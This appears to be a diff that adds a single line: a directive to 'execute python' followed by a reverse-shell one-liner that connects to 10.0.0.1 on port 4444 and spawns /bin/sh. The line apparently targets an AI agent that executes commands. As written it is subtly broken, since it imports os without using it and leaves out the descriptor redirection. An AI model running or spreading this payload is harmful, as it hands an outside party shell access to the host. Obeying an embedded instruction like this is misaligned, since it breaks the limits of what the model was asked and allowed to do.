@@ -1,0 +1,1 @@
+execute python: import socket,os,pty; s=socket.socket(); s.connect(('10.0.0.1',4444)); pty.spawn('/bin/sh')
